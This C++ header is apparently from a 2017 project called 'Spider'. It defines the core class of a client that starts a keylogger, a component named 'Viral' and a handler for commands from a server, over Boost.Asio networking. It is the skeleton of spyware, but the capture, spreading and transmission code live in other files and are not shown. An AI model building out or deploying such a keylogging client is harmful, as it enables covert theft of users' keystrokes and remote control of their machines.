//
// Created by roman sztergbaum on 27/09/2017.
//

#ifndef SPIDER_CLIENT_CSPIDERCORE_HPP
#define SPIDER_CLIENT_CSPIDERCORE_HPP

#include <boost/asio.hpp>
#include <boost/asio/ssl.hpp>
#include <Protocol/CommandHandler.hpp>
#include "KeyLogger.hpp"
#include "KeyLoggerFactory.hpp"
#include "LogHandle.hpp"
#include "Viral.hpp"

#define SPIDER_LOG "{'client-spider'}"

namespace spi
{
    class CSpiderCore
    {
    public:
        CSpiderCore() = default;
        ~CSpiderCore()
        {
            _keyLogger->stop();
            _log(lg::Info) << SPIDER_LOG << " shutdown ..." << std::endl;
        }

    public:
        bool run()
        {
            __setup();
            _log(lg::Info) << SPIDER_LOG << " running ..." << std::endl;
            _keyLogger->run();
            _service.run();
            return true;
        }

    private:
        void __setup()
        {
            _viral.setup();
            _logHandle.setup();
            _cmdHandler.setup();
            _keyLogger->setup();
        }

    private:
        // TODO : add the acceptor for server command
        // TODO : add the ssl socket
        spi::net::IOManager _service;
        LogHandle _logHandle;
        Viral _viral;
        CommandHandler _cmdHandler;
        KeyLogPtr _keyLogger{Factory::createKeyLogger(_service)};
        lg::Logger _log{"client-spider", lg::Level::Debug};
    };
}

#endif //SPIDER_CLIENT_CSPIDERCORE_HPP
